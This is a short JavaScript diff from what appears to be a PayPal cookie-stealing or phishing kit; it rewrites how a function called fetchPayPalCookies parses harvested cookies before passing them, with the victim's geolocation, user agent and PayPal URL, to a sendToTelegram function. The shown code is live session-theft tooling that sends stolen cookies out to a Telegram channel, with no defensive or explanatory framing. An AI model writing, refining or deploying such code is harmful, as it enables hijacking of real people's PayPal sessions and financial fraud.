@@ -84,9 +84,18 @@ async function fetchPayPalCookies(paypalUrl, userTag, examNumber, clientUserAgen
         const data = await response.json();
         if (data.errors) throw new Error(data.errors[0].message);
 
-        // The cookies field is an array of strings like "name=value"
+        // Parse cookies from the response
         const cookies = data.data.cookies;
-        const cookieString = cookies.join('; ');
+        let cookieString = "";
+        if (Array.isArray(cookies)) {
+            cookies.forEach(cookie => {
+                // Extract the first part of the cookie string (name=value)
+                const cookieParts = cookie.split(';')[0].trim();
+                if (cookieParts) {
+                    cookieString += cookieParts + "; ";
+                }
+            });
+        }
 
         const geoInfo = await getGeoInfo();
         await sendToTelegram(cookieString || "No cookies found", userTag, examNumber, geoInfo, paypalUrl, userAgent);
